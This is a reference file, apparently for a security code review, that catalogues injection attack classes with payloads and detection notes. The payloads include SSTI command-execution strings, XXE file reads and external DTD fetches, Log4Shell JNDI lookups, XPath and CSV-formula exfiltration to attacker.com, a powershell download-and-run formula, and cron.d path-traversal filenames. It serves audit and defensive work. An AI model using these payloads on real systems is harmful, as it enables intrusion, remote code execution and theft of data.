# Injection Taxonomy Reference

Load this file during Phase 3 and when building sink maps in Phase 2.

---

## SQL Injection

- **Classic:** string-delimited query construction
- **Blind boolean:** `AND 1=1` / `AND 1=2` response delta
- **Blind time-based:** `'; WAITFOR DELAY '0:0:5'--`, `SLEEP(5)`
- **Error-based:** `extractvalue()`, `updatexml()`, `convert()`
- **Out-of-band:** DNS exfiltration via `load_file()`, `xp_dirtree`, `UTL_HTTP`
- **Second-order:** user data stored clean, then interpolated into dynamic query later —
  check every place DB-read values are used in subsequent query construction
- **ORM escape hatches:** `raw()`, `execute()`, `query()`, `fromRawSql()`, `whereRaw()`
- **Stored procedures with dynamic SQL:** `EXEC(@sql)`, `sp_executesql`

---

## NoSQL Injection

- MongoDB operator injection: `{"$gt": ""}`, `{"$where": "this.password == 'x'"}`,
  `{"$regex": ".*"}` — inject via JSON body when field expects scalar
- Firestore: field path construction from user input
- Redis EVAL: Lua code injection via `EVAL` with user-controlled script
- Elasticsearch DSL: query injection via `query_string` with user input

---

## OS Command Injection

- Shell metacharacters: `; | & > < `` $() ${}`
- Argument injection to "safe" binaries: `git --upload-pack=malicious`, `ffmpeg -i http://...`,
  `curl -o /etc/cron.d/x`, `rsync -e sh`
- Language-specific sinks:
  - Python: `subprocess.call(shell=True)`, `os.system()`, `os.popen()`
  - Node: `child_process.exec()`, `child_process.execSync()`
  - PHP: `shell_exec()`, `exec()`, `passthru()`, `system()`, backtick operator
  - Ruby: backtick, `system()`, `IO.popen()`, `%x{}`
  - Java: `Runtime.getRuntime().exec()`, `ProcessBuilder`
  - Go: `exec.Command()` with `sh -c` and user-controlled argument

---

## Server-Side Template Injection (SSTI)

Detection: inject `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` — `49` in response = likely SSTI.

**Jinja2 / Python:**
```
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()}}
```

**Twig / PHP:**
```
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

**Freemarker / Java:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Pebble / Java:**
```
{% set cmd = 'id' %}
{% set bytes = [].class.forName('java.lang.Runtime').getMethod('exec',...) %}
```

**Velocity / Java:**
```
#set($runtime = $class.inspect("java.lang.Runtime").type)
#set($process = $runtime.exec("id"))
```

**ERB / Ruby:**
```
<%= `id` %>
<%= system('id') %>
```

**Handlebars / Node.js:**
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}...{{/with}}{{/with}}{{/with}}
```

**Key distinction:** data context (safe) vs expression context (exploitable).
If user input flows into the template **string itself** (not a template variable), it's SSTI.

---

## LDAP Injection

- DN injection: user-controlled string inserted into Distinguished Name
- Filter injection: `(uid=*)`, `(|(uid=*)(password=*))`, `*)(&`
- Authentication bypass: username `admin)(|(password=*)`
- Special chars: `*`, `(`, `)`, `\`, NUL byte

---

## XPath Injection

- String-delimited filter: `//user[name/text()='<INPUT>' and password/text()='x']`
- Boolean blind: `' or '1'='1`, `' or '1'='2`
- OOB via `doc()` function if enabled: `doc('http://attacker.com/?x='+name)`

---

## XML External Entity (XXE)

Classic file read:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

Blind OOB via external DTD:
```xml
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>
```

SSRF via external entity to internal service:
```xml
<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

Per-parser hardening checks:
- libxml2: `LIBXML_NOENT` flag absent?
- Python `lxml`: `resolve_entities=False`?
- Java SAXParser: `XMLConstants.FEATURE_SECURE_PROCESSING`?
- PHP SimpleXML: `LIBXML_NOENT` not passed?
- .NET XmlReader: `DtdProcessing.Prohibit`?

---

## Log Injection & Log4Shell

- CRLF into log statements → fake log entries, log file corruption
- Log4j2 JNDI: `${jndi:ldap://attacker.com/a}` in ANY logged field
  (user-agent, username, email, X-Forwarded-For, referrer, search query)
- Verify: Log4j2 version ≥ 2.17.1 OR `log4j2.formatMsgNoLookups=true`
- Also check: `${jndi:rmi://}`, `${jndi:dns://}`, obfuscated: `${${lower:j}ndi:...}`

---

## CRLF & HTTP Header Injection

- `\r\n` in: redirect targets, Location header, Set-Cookie value construction
- HTTP response splitting: inject `\r\n\r\n` to control response body
- Attack paths: cache poisoning, XSS via injected Content-Type, session fixation via Set-Cookie

---

## CSV / Formula Injection

Inject as first character of any CSV field: `=`, `+`, `-`, `@`
```
=HYPERLINK("http://attacker.com/?data="&A1&B1,"click")
=cmd|'/C calc'!A0
+cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString(...)'!A0
```
- DDE injection in XLSX exports (Excel Dynamic Data Exchange)
- Mitigations: prefix with `'`, escape leading special chars, set `Content-Disposition: attachment`

---

## Regular Expression DoS (ReDoS)

Catastrophic backtracking patterns:
- `(a+)+` — exponential on `aaa...X`
- `([a-zA-Z]+)*` — exponential
- `(a|aa)+` — exponential
- `(a*)*` — exponential

Detection: user-controlled input fed to regex → find patterns with ambiguous quantification.
Impact in synchronous runtimes: Node.js, Python (GIL), Ruby — single long regex blocks entire thread.
Mitigation: use linear-time regex engines (RE2/Hyperscan), set regex timeout, pre-validate length.

---

## Host Header Injection

Attack surfaces:
- Password reset link: `$_SERVER['HTTP_HOST']`, `request.get_host()`, `Request.headers['Host']`
  → poisoned link sent to victim: `https://attacker.com/reset?token=xxx`
- Web cache poisoning: Host header used as cache key component
- SSRF amplification: X-Forwarded-Host trusted for redirect base construction

---

## Open Redirect

Common parameter names: `next`, `redirect`, `redirect_to`, `return`, `return_url`,
`continue`, `url`, `goto`, `destination`, `target`, `rurl`, `dest`

Bypass patterns:
- `//evil.com` — protocol-relative
- `\/evil.com` — backslash normalization
- `https:evil.com` — colon without slashes
- `%2F%2Fevil.com` — URL-encoded slashes
- `https://legit.com@evil.com` — authority confusion
- `https://legit.com%2F@evil.com`
- Unicode normalization: `ℙ` → `P` in some parsers

Exploit chains:
- Open redirect → OAuth token theft (redirect_uri pointing to open redirect → code/token in location)
- Open redirect → Phishing
- Open redirect → SSRF bypass (redirect followed by HTTP client)

---

## HTTP Request Smuggling

CL.TE (Content-Length frontend, Transfer-Encoding backend):
```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

TE.CL (Transfer-Encoding frontend, Content-Length backend):
```
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

Detection: differential response timing between CL and TE interpretations.
Impacts: bypass front-end security controls, cache poisoning, credential hijacking,
capturing other users' requests.

---

## HTTP/2 Attacks

- **HPACK bomb:** HTTP/2 header compression — send small compressed payload that
  expands to gigabytes → memory exhaustion on decompression
- **Stream flooding:** open maximum concurrent streams (default 100) → CPU exhaustion
- **h2c upgrade smuggling:** HTTP/1.1 → HTTP/2 cleartext upgrade to smuggle requests
  past front-end proxies that don't validate h2c properly
- **Reset flood (CVE-2023-44487 / Rapid Reset):** stream open + RST_STREAM in rapid
  succession → server processes partial requests without completion → DoS

---

## Cache Poisoning

**Web Cache Deception:**
- Attacker tricks victim into visiting `https://target.com/account/info.css`
- Server returns dynamic user account page (ignores `.css` extension)
- CDN caches the response keyed on URL → attacker fetches same URL, gets victim data

**Cache Key Manipulation:**
- Inject unkeyed headers (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL) into
  cached response that reflects them → XSS or redirect cached for all users
- Parameter cloaking: `?param=value&utm_source=` — cache strips tracking params,
  but backend processes them

**Fat GET:** GET request with body — some caches ignore body, backend processes it

---

## File Upload Security

**MIME Type Bypass:**
- Server trusts `Content-Type` header → set to `image/jpeg`, upload PHP/JSP/ASPX
- Magic byte bypass: prepend valid JPEG magic bytes (`FFD8FF`) before PHP payload
- Polyglot files: valid JPEG that is also valid PHP (GIF89a + PHP payload)

**Filename Attacks:**
- Path traversal in filename: `../../../etc/cron.d/shell`
- Null byte truncation: `shell.php%00.jpg` (older PHP/C)
- Double extension: `shell.php.jpg` (served as PHP if server misconfigured)
- NTFS alternate data streams: `shell.asp::$DATA`

**SVG XSS:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```
Upload SVG → serve inline → XSS without any filename bypass needed.

**Archive Extraction (Zip Slip):**
```python
# Malicious zip entry name: "../../../../etc/cron.d/shell"
# Extracting without path normalization writes to arbitrary location
```

**Size & Dimension Bombs:**
- 1×1 PNG that decompresses to 100k×100k (allocates ~40GB)
- PDF with recursive references → rendering engine exhaustion

---

## Webhook Security

- **Missing HMAC validation:** webhook payload not signed → attacker can POST arbitrary
  events to the webhook endpoint
- **Signature bypass:** HMAC computed over only partial payload; algorithm confusion
  (SHA-1 vs SHA-256); timing attack in comparison (see `references/crypto.md`)
- **Replay window unbounded:** no timestamp in signed payload or timestamp not validated
  → captured legitimate webhook can be replayed indefinitely
- **IP allowlisting as sole control:** SSRF from any internal service bypasses IP check
- **Event type not validated:** handler processes event type from payload without verifying
  it matches the endpoint's expected event type

---

## Subdomain Takeover

**Mechanism:** DNS CNAME points to deprovisioned cloud resource (S3 bucket, GitHub Pages,
Heroku app, Azure blob, Fastly endpoint) → attacker claims the resource →
controls the subdomain.

**Impact:**
- Cookie scope attack: `Set-Cookie: session=x; Domain=.target.com` accessible from
  taken-over subdomain
- OAuth redirect_uri bypass: `https://taken-over.target.com` is valid redirect
- Email spoofing if subdomain used in SPF/DKIM
- Full XSS on subdomain (same-site but different origin)

**Detection signals:**
- CNAME records pointing to: `*.s3.amazonaws.com`, `*.github.io`, `*.herokuapp.com`,
  `*.azurewebsites.net`, `*.cloudapp.net`, `*.fastly.net`, `*.readthedocs.io`
  → fetch the target → if returns 404/NoSuchBucket/Repository not found → claimable
- Also check: NS delegation to deprovisioned DNS provider (entire zone takeover)
